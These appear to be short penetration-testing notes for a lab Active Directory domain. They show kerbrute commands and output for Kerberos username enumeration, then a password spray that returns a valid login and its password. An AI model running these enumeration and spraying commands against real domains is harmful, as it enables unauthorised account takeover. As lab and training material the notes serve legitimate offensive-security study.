# Enum

## AD spray

### Execution

```bash
# abuse KDC_ERR_C_PRINCIPAL_UNKNOWN
kerbrute_linux_amd64 userenum -d sales.contoso.lab --dc 192.168.1.12 usernames.txt
# Version: v1.0.3 (9dad6e1) - 04/24/26 - Ronnie Flathers @ropnop
# 
# 2026/04/24 12:35:46 >  Using KDC(s):
# 2026/04/24 12:35:46 >   192.168.1.12:88
# 
# 2026/04/24 12:35:46 >  [+] VALID USERNAME:       alice@sales.contoso.lab
# 2026/04/24 12:35:46 >  Done! Tested 3 usernames (1 valid) in 0.002 seconds

# spray
kerbrute_linux_amd64 passwordspray -d sales.contoso.lab --dc 192.168.1.12 usernames.txt '1AM4l1c3!?'
# Version: v1.0.3 (9dad6e1) - 04/24/26 - Ronnie Flathers @ropnop
# 
# 2026/04/24 12:37:06 >  Using KDC(s):
# 2026/04/24 12:37:06 >   192.168.1.12:88
# 
# 2026/04/24 12:37:06 >  [+] VALID LOGIN:  alice@sales.contoso.lab:1AM4l1c3!?
# 2026/04/24 12:37:06 >  Done! Tested 3 logins (1 successes) in 0.009 seconds
```
